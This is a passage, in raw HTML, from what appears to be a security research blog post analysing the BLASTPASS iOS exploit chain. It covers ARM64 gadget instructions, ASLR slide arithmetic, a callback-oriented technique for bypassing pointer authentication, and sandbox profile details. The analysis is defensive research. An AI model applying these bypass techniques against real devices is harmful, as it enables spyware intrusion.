 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Let&amp;#39;s walk through each instruction in turn there:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;First it loads the 64-bit value from &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X19+0x30&lt;/span&gt;&lt;span&gt;&amp;nbsp;into &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X8&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;LDR&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[X19,#0x30]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Looking at the hexdump of the 1MB object above this will load the value &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x25846ec20&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;From the crash reports we know the runtime ASLR slide of the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MessagesBlastDoorService&lt;/span&gt;&lt;span&gt;&amp;nbsp;when this exploit was thrown was &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x3A8D0000&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, so subtracting that we can figure out where in the shared cache this pointer should point:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;0x25846ec20-0x3A8D0000=0x21DB9EC20&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It points into the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;__const&lt;/span&gt;&lt;span&gt;&amp;nbsp;segment of the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;TextToSpeechMauiSupport&lt;/span&gt;&lt;span&gt;&amp;nbsp;library in the shared cache:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisVBydDqsc93nYCwXZuJdCfA16RTdCOLAgDG0jBVQ1_qAmFpkdYPTzqHv4W69SbzLVBkNd9lgBoy8m3EWOfwDpS9EKDxwWt35m1eJnpER6E2UxaG3e8tBYdBwxA7bHvMuvUzH2zRNYj-C1HfRQHrOAI5qWHBVm9E4XYMWV8q-Wu0qk0j4-hEyYMEGxuWc/s1999/image14.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisVBydDqsc93nYCwXZuJdCfA16RTdCOLAgDG0jBVQ1_qAmFpkdYPTzqHv4W69SbzLVBkNd9lgBoy8m3EWOfwDpS9EKDxwWt35m1eJnpER6E2UxaG3e8tBYdBwxA7bHvMuvUzH2zRNYj-C1HfRQHrOAI5qWHBVm9E4XYMWV8q-Wu0qk0j4-hEyYMEGxuWc/s1200/image14.png&quot; border=&quot;0&quot; alt=&quot;Assembly code snippet with the memory address 000000021DB9EC20 highlighted, followed by DataSectionWriter function definitions.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Assembly code snippet with the memory address 000000021DB9EC20 highlighted, followed by DataSectionWriter function definitions.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The next instruction adds &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;to that TextToSpeechMauiSupport pointer and reads a 64-bit value from there:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;LDR&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[X8,#0x58]&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;x8&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;:=&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[0x21DB9EC20+0x58]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;This loads the pointer to the function &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;_DataSectionWriter_CommitDataBlock&lt;/span&gt;&lt;span&gt;&amp;nbsp;from &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;0x21DB9EC78&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;IDA is simplifying something for us here: the function pointer loaded there is actually signed with the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html&quot;&gt;A-family instruction key&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html&quot;&gt;&amp;nbsp;with a zero context&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. This signing happens transparently (either during load or when the page is faulted in).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The remaining four instructions then check that the pointer wasn&amp;#39;t &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;NULL&lt;/span&gt;&lt;span&gt;, load &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X1&lt;/span&gt;&lt;span&gt;&amp;nbsp;from offset &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;+0x28&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the fake 1MB object, move the pointer to the fake object back into &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;X0&lt;/span&gt;&lt;span&gt;&amp;nbsp;and call the PAC&amp;#39;ed &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;_DataSectionWriter_CommitDataBlock&lt;/span&gt;&lt;span&gt;&amp;nbsp;function pointer via &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;BLRAAZ&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;CBZ&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;loc_187076758&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;LDR&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X1,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;[X19,#0x28]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;MOV&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X0,&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X19&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;BLRAAZ&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;X8&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.85z2ks5ykaev&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Callback-Oriented Programming&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;A well-known attack against PAC is to swap two valid, PAC&amp;#39;ed pointers which are signed in the same way but point to different places (e.g. swapping two function pointers with different semantics, allowing you to exploit those semantic differences).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Since a large number of PAC-protected pointers are signed with the A-family instruction key with a zero-context value, there are a large number of pointers to choose from. &amp;quot;Just&amp;quot; having an ASLR defeat shouldn&amp;#39;t be enough to achieve this though; surely you&amp;#39;d need to disclose the actual PAC&amp;#39;ed pointer value? But that&amp;#39;s not what happened above.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Notice that the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFStream&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects don&amp;#39;t directly contain the callback function pointers &amp;mdash; there&amp;#39;s an extra level of indirection. The &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;CFStream&lt;/span&gt;&lt;span&gt;&amp;nbsp;object contains a pointer &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c25&quot;&gt;to&lt;/span&gt;&lt;span&gt;&amp;nbsp;a callback structure, and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;that&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure has the PAC&amp;#39;d function pointers. And crucially: that first pointer, the one &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c25&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;the callbacks structure, isn&amp;#39;t protected by PAC. This means that the attackers can freely swap pointers to callback structures, operating one-level removed from the function pointers.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;This might seem like a severe constraint, but the dyld_shared_cache is vast and there are easily enough pre-existing callback structures to build a &amp;quot;callback-oriented JOP&amp;quot; chain, chaining together unsigned pointers to signed function pointers.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;The initial portion of the payload is a large callback-oriented JOP chain which is used to bootstrap the evaluation of the next payload stage, a large NSExpression.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.x0b2urrhmfz4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Similarities&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;There are a number of similarities between this exploit chain and PWNYOURHOME, an earlier exploit also attributed by CitizenLab to NSO, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://citizenlab.ca/2023/04/nso-groups-pegasus-spyware-returns-in-2022/&quot;&gt;described in this blog post in April 2023&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;That chain also had an initial stage targeting HomeKit, followed by a stage targeting &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MessagesBlastDoorService&lt;/span&gt;&lt;span&gt;&amp;nbsp;and also involving a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MakerNote&lt;/span&gt;&lt;span&gt;&amp;nbsp;object &amp;mdash; the Citizen Lab post claims that at the time the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MakerNote&lt;/span&gt;&lt;span&gt;&amp;nbsp;was inside a PNG file. My guess would be that that PNG was being used as the delivery mechanism for the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;MakerNote&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;bplist heap grooming primitives discussed in this post.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Based on Citizen Lab&amp;#39;s description it also seems like PWNYOURHOME was leveraging a similar callback-oriented JOP technique, and it seems likely that there was also a HomeKit-based ASLR disclosure. The PWNYOURHOME post has a couple of extra details around a minor fix which Apple made, preventing parsing of &amp;quot;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;certain HomeKit messages unless they arrive from a plausible source.&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;quot; But there still aren&amp;#39;t enough details to figure out the underlying vulnerability or primitive. It seems likely to me that the same issue, or a variant thereof was still in use in BLASTPASS.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.x3s02rsriugj&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Key material&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Matthias from iVerify presented an &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://i.blackhat.com/Asia-24/Asia-24-Frielingsdorf-YouShallNotPassAnalysing.pdf&quot;&gt;initial analysis of the NSExpression payload at BlackHat Asia&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;in April 2024. In early July 2024, Matthias and I took a closer look at the final stages of the NSExpression payload which decrypts an AES-encrypted NSExpression and executes it.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;It seems very likely that the encrypted payload contains a BlastDoor sandbox escape. Although the BlastDoor sandbox profile is fairly restrictive it still allows access to a number of system services like &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;notifyd&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;logd&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;mobilegestalt&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. In addition to the syscall attack surface there&amp;#39;s also a non-trivial IOKit driver attack surface:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(allow&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;iokit-open-user-client&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(iokit-user-client-class&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;quot;IOSurfaceRootUserClient&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(iokit-user-client-class&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;quot;IOSurfaceAcceleratorClient&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(iokit-user-client-class&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;quot;AGXDevice&amp;quot;))&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(allow&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;iokit-open-service)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(allow&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;mach-derive-port)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(allow&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;mach-kernel-endpoint)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(allow&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;mach-lookup&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(require-all&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(require-not&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;quot;com.apple.diagnosticd&amp;quot;))&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(require-any&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;quot;com.apple.logd&amp;quot;)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;(global-name&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c6 XQFzMDWmii-c8&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c1&quot;&gt;&amp;quot;com.apple.system.notification_center&amp;quot;)&lt;/span&gt;&lt;/p&gt;
